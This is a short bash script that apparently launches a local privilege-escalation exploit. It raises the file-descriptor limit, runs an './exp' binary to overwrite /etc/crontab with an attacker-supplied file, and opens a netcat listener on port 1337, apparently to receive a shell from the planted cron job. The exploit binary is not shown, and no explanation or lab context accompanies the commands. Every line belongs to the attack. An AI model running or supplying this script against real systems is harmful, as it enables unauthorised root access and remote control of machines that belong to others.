#!/bin/bash
ulimit -n 1040000
./exp /etc/crontab ./crontab
nc -lp 1337
